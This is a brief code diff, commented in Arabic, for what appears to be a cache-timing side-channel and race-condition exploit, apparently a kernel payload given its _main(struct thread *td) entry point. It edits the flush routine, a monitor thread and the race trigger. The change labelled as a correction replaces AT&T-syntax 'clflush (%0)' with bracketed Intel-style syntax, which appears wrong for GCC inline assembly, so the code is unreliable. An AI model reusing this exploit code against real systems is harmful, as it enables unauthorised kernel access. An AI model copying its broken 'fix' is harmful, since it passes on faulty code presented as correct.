@@ -165,7 +165,7 @@ static volatile int start_flag = 0;
 static unsigned char probe_array[PROBE_PAGES * STRIDE];
 
 static inline void flush_cache(void *addr) {
-    __asm__ volatile ("clflush (%0)" : : "r"(addr));
+    __asm__ volatile ("clflush [%0]" : : "r"(addr)); // تم التصحيح
 }
 
 static inline uint64_t read_tsc(void) {
@@ -176,6 +176,8 @@ static inline uint64_t read_tsc(void) {
 
 // Helper thread: يراقب كامل probe_array
 void *cache_monitor_thread(void *arg) {
+    (void)arg; // إزالة التحذير
+
     uint64_t t1, t2;
 
     while (!start_flag);
@@ -244,10 +246,6 @@ int _main(struct thread *td) {
     printf_debug("Race Started\n");
 
     start_flag = 1;
-
-    // =========================
-    // الجزء المهم (التجربة)
-    // =========================
 
     // trigger
     memcpy(dest, edge_src, 8);
